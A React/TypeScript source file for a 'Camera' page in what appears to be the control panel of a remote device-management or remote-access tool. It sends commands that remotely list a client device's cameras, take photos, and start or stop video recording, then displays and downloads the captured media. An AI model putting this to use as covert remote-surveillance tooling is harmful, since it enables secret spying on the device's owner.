import { useState, useCallback, useRef, useEffect } from 'react';
import { useOutletContext } from 'react-router-dom';
import { useDeviceData } from '@/hooks/useDeviceData';
import type { DeviceOutletContext, ClientFile, CameraDevice } from '@/types';
import { CMD, extractList } from '@/types';
import { DevicePageHeader, SectionCard, LoadingSkeleton, StatusBadge } from '@/components/device/shared';
import { DataActionsMenu, buildFileActions } from '@/components/device/DataActionsMenu';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Camera as CameraIcon, Image, AlertCircle, X, Download, ZoomIn, Video, Square, Circle } from 'lucide-react';
import { onDataUpdate } from '@/services/socket';

export default function CameraPage() {
  const { clientId, online } = useOutletContext<DeviceOutletContext>();
  const [capturingId, setCapturingId] = useState<number | null>(null);
  const [captureError, setCaptureError] = useState<string | null>(null);
  const [flashMode, setFlashMode] = useState<string>('auto');
  const [quality, setQuality] = useState<string>('medium');
  const [lightboxPhoto, setLightboxPhoto] = useState<ClientFile | null>(null);
  const [lightboxVideo, setLightboxVideo] = useState<ClientFile | null>(null);
  const [recordingCameraId, setRecordingCameraId] = useState<number | null>(null);
  const [recordSeconds, setRecordSeconds] = useState(0);
  const captureTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const recordTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    return () => {
      if (captureTimerRef.current) clearTimeout(captureTimerRef.current);
      if (recordTimerRef.current) clearInterval(recordTimerRef.current);
    };
  }, []);

  const { data: rawData, loading, error, refresh, sendCommand, commandStatus, clearData } = useDeviceData<{
    cameras: CameraDevice[];
    photos: ClientFile[];
    videos: ClientFile[];
    permission: boolean | null;
  }>({
    clientId,
    page: 'camera',
    extractData: (d) => ({
      cameras: extractList<CameraDevice>(d.cameras),
      photos: Array.isArray(d.photos) ? d.photos : [],
      videos: Array.isArray(d.videos) ? d.videos : [],
      permission: d.permission === true || d.permission === false ? d.permission : null,
    }),
    dataType: 'camera',
    defaultValue: { cameras: [], photos: [], videos: [], permission: null },
  });

  const cameras = rawData.cameras;
  const photos = rawData.photos;
  const videos = rawData.videos;
  const permission = rawData.permission;

  const [exporting, setExporting] = useState(false);

  const fileActions = buildFileActions({
    files: [
      ...photos.map((p) => ({ url: `/api/files/photos/${clientId}/${p.id}`, name: p.originalName })),
      ...videos.map((v) => ({ url: `/api/files/videos/${clientId}/${v.id}`, name: v.originalName })),
    ],
    metadata: [...photos, ...videos],
    exportPrefix: 'camera-media',
    onClear: clearData,
    onExportStart: () => setExporting(true),
    onExportEnd: () => setExporting(false),
  });

  const listCameras = useCallback(async () => {
    setCaptureError(null);
    try {
      await sendCommand(CMD.CAMERA, { action: 'list' });
    } catch {
      setCaptureError('Failed to detect cameras.');
    }
  }, [sendCommand]);

  const didAutoDetect = useRef(false);
  useEffect(() => {
    if (!didAutoDetect.current && online && cameras.length === 0) {
      didAutoDetect.current = true;
      listCameras();
    }
  }, [online, cameras.length, listCameras]);

  const capturePhoto = async (cameraId: number) => {
    setCapturingId(cameraId);
    setCaptureError(null);
    try {
      await sendCommand(CMD.CAMERA, { action: 'capture', id: cameraId, flash: flashMode, quality });
    } catch (err: any) {
      setCaptureError(err?.response?.data?.error || 'Capture failed.');
      setCapturingId(null);
      return;
    }
    captureTimerRef.current = setTimeout(() => setCapturingId(null), 30000);
  };

  useEffect(() => {
    if (commandStatus === 'responded' || commandStatus === 'error') {
      if (captureTimerRef.current) {
        clearTimeout(captureTimerRef.current);
        captureTimerRef.current = null;
      }
      setCapturingId(null);
      if (commandStatus === 'error') setCaptureError('Capture failed on device.');
    }
  }, [commandStatus]);

  const startRecording = async (cameraId: number) => {
    setCaptureError(null);
    try {
      await sendCommand(CMD.CAMERA, { action: 'record', id: cameraId });
      setRecordingCameraId(cameraId);
      setRecordSeconds(0);
      recordTimerRef.current = setInterval(() => setRecordSeconds(s => s + 1), 1000);
    } catch (err: any) {
      setCaptureError(err?.response?.data?.error || 'Failed to start recording.');
    }
  };

  const stopRecording = async () => {
    try {
      await sendCommand(CMD.CAMERA, { action: 'stop' });
    } catch {
      setCaptureError('Failed to stop recording.');
    }
    setRecordingCameraId(null);
    if (recordTimerRef.current) {
      clearInterval(recordTimerRef.current);
      recordTimerRef.current = null;
    }
  };

  useEffect(() => {
    const unsub = onDataUpdate((cid, dataType, payload) => {
      if (cid !== clientId || dataType !== 'camera') return;
      if (payload?.videoStatus === 'recording') {
        /* state already set by startRecording */
      } else if (payload?.videoStatus === 'stopped') {
        setRecordingCameraId(null);
        if (recordTimerRef.current) {
          clearInterval(recordTimerRef.current);
          recordTimerRef.current = null;
        }
      }
    });
    return unsub;
  }, [clientId]);

  const formatTimer = (s: number) => {
    const m = Math.floor(s / 60);
    const sec = s % 60;
    return `${m.toString().padStart(2, '0')}:${sec.toString().padStart(2, '0')}`;
  };

  return (
    <div className="space-y-5">
      <DevicePageHeader
        title="Camera"
        subtitle={`${cameras.length} cameras, ${photos.length} photos, ${videos.length} videos`}
        actions={[
          { label: 'Detect', icon: CameraIcon, onClick: listCameras, disabled: !online },
        ]}
        moreActions={<DataActionsMenu actions={fileActions} disabled={loading} loadingLabel={exporting ? 'Export ZIP' : null} />}
        refresh={refresh}
        loading={loading}
        commandStatus={commandStatus}
      />

      {permission !== null && (
        <StatusBadge label={permission ? 'Permission Granted' : 'Permission Denied'} status={permission ? 'success' : 'danger'} />
      )}

      {captureError && (
        <div className="p-3 rounded-lg bg-destructive/10 border border-destructive/20 text-destructive text-sm flex items-center gap-2">
          <AlertCircle className="h-4 w-4 shrink-0" />
          {captureError}
          <button onClick={() => setCaptureError(null)} className="ml-auto"><X className="h-3.5 w-3.5" /></button>
        </div>
      )}

      {}
      {recordingCameraId !== null && (
        <div className="flex items-center gap-3 p-3 rounded-lg bg-red-500/10 border border-red-500/20">
          <Circle className="h-4 w-4 text-red-500 animate-pulse fill-red-500" />
          <span className="text-sm font-mono font-bold text-red-500">{formatTimer(recordSeconds)}</span>
          <span className="text-xs text-muted-foreground">Recording...</span>
          <Button variant="destructive" size="sm" onClick={stopRecording} className="ml-auto gap-1.5 h-7">
            <Square className="h-3.5 w-3.5" /> Stop
          </Button>
        </div>
      )}

      {}
      {cameras.length > 0 && (
        <div className="flex items-center gap-3 flex-wrap">
          <div className="flex items-center gap-1.5">
            <span className="text-xs text-muted-foreground">Flash:</span>
            {['auto', 'on', 'off'].map(f => (
              <button key={f} onClick={() => setFlashMode(f)} className={`text-xs px-2.5 py-1 rounded-md transition-colors capitalize ${flashMode === f ? 'bg-primary text-primary-foreground' : 'bg-muted text-muted-foreground hover:bg-muted/70'}`}>{f}</button>
            ))}
          </div>
          <div className="flex items-center gap-1.5">
            <span className="text-xs text-muted-foreground">Quality:</span>
            {['low', 'medium', 'high'].map(q => (
              <button key={q} onClick={() => setQuality(q)} className={`text-xs px-2.5 py-1 rounded-md transition-colors capitalize ${quality === q ? 'bg-primary text-primary-foreground' : 'bg-muted text-muted-foreground hover:bg-muted/70'}`}>{q}</button>
            ))}
          </div>
        </div>
      )}

      {loading && !error ? (
        <LoadingSkeleton rows={4} />
      ) : (
        <>
          {cameras.length > 0 && (
            <SectionCard title="Available Cameras">
              <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
                {cameras.map((cam, i) => (
                  <Card key={`cam-${cam.id ?? i}`} className="shadow-none bg-muted/40">
                    <CardContent className="p-3 text-center">
                      <CameraIcon className="h-6 w-6 mx-auto mb-1.5 text-primary" />
                      <p className="font-medium text-xs">{cam.name || `Camera ${i + 1}`}</p>
                      <p className="text-[10px] text-muted-foreground mb-2">ID: {cam.id ?? i}</p>
                      <div className="flex gap-1.5 justify-center">
                        <Button size="sm" onClick={() => capturePhoto(cam.id ?? i)} disabled={capturingId !== null || recordingCameraId !== null || !online} className="h-7 text-xs">
                          {capturingId === (cam.id ?? i) ? '...' : 'Capture'}
                        </Button>
                        {recordingCameraId === (cam.id ?? i) ? (
                          <Button variant="destructive" size="sm" onClick={stopRecording} className="h-7 text-xs gap-1">
                            <Square className="h-3 w-3" /> Stop
                          </Button>
                        ) : (
                          <Button variant="outline" size="sm" onClick={() => startRecording(cam.id ?? i)} disabled={capturingId !== null || recordingCameraId !== null || !online} className="h-7 text-xs gap-1">
                            <Video className="h-3 w-3" /> Record
                          </Button>
                        )}
                      </div>
                    </CardContent>
                  </Card>
                ))}
              </div>
            </SectionCard>
          )}

          {}
          {videos.length > 0 && (
            <SectionCard title={`Videos (${videos.length})`} icon={Video}>
              <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-2">
                {videos.map((video) => (
                  <div key={`vid-${video.id}`} className="relative group">
                    <div className="aspect-video bg-muted rounded-lg overflow-hidden cursor-pointer flex items-center justify-center" onClick={() => setLightboxVideo(video)}>
                      <Video className="h-8 w-8 text-muted-foreground" />
                      <div className="absolute inset-0 bg-black/0 group-hover:bg-black/30 transition-colors flex items-center justify-center">
                        <ZoomIn className="h-5 w-5 text-white opacity-0 group-hover:opacity-100 transition-opacity" />
                      </div>
                    </div>
                    <p className="text-[10px] text-muted-foreground mt-0.5 truncate">{video.originalName}</p>
                  </div>
                ))}
              </div>
            </SectionCard>
          )}

          {}
          <SectionCard title={`Photos (${photos.length})`} icon={Image}>
            {photos.length === 0 ? (
              <div className="py-6 text-center">
                <Image className="h-8 w-8 mx-auto mb-2 text-muted-foreground/40" />
                <p className="text-sm text-muted-foreground">No photos captured</p>
              </div>
            ) : (
              <div className="grid grid-cols-3 sm:grid-cols-4 lg:grid-cols-6 gap-2">
                {photos.map((photo) => (
                  <div key={`photo-${photo.id}`} className="relative group">
                    <div className="aspect-square bg-muted rounded-lg overflow-hidden cursor-pointer" onClick={() => setLightboxPhoto(photo)}>
                      <img src={`/api/files/photos/${clientId}/${photo.id}`} alt={photo.originalName} className="w-full h-full object-cover" loading="lazy" />
                      <div className="absolute inset-0 bg-black/0 group-hover:bg-black/30 transition-colors flex items-center justify-center">
                        <ZoomIn className="h-5 w-5 text-white opacity-0 group-hover:opacity-100 transition-opacity" />
                      </div>
                    </div>
                    <p className="text-[10px] text-muted-foreground mt-0.5 truncate">{photo.originalName}</p>
                  </div>
                ))}
              </div>
            )}
          </SectionCard>
        </>
      )}

      {}
      {lightboxPhoto && (
        <div className="fixed inset-0 z-50 bg-black/80 flex items-center justify-center p-4" onClick={() => setLightboxPhoto(null)}>
          <div className="relative max-w-3xl max-h-[90vh]" onClick={e => e.stopPropagation()}>
            <img src={`/api/files/photos/${clientId}/${lightboxPhoto.id}`} alt={lightboxPhoto.originalName} className="max-w-full max-h-[80vh] rounded-lg" />
            <div className="flex items-center justify-center gap-3 mt-3">
              <a href={`/api/files/photos/${clientId}/${lightboxPhoto.id}`} download>
                <Button variant="outline" size="sm" className="gap-1.5"><Download className="h-4 w-4" /> Download</Button>
              </a>
            </div>
            <button className="absolute -top-3 -right-3 bg-background rounded-full p-1.5 shadow-lg" onClick={() => setLightboxPhoto(null)}>
              <X className="h-5 w-5" />
            </button>
          </div>
        </div>
      )}

      {}
      {lightboxVideo && (
        <div className="fixed inset-0 z-50 bg-black/80 flex items-center justify-center p-4" onClick={() => setLightboxVideo(null)}>
          <div className="relative max-w-4xl max-h-[90vh]" onClick={e => e.stopPropagation()}>
            <video
              src={`/api/files/videos/${clientId}/${lightboxVideo.id}`}
              controls
              autoPlay
              className="max-w-full max-h-[80vh] rounded-lg"
            />
            <div className="flex items-center justify-center gap-3 mt-3">
              <a href={`/api/files/videos/${clientId}/${lightboxVideo.id}`} download>
                <Button variant="outline" size="sm" className="gap-1.5"><Download className="h-4 w-4" /> Download</Button>
              </a>
            </div>
            <button className="absolute -top-3 -right-3 bg-background rounded-full p-1.5 shadow-lg" onClick={() => setLightboxVideo(null)}>
              <X className="h-5 w-5" />
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
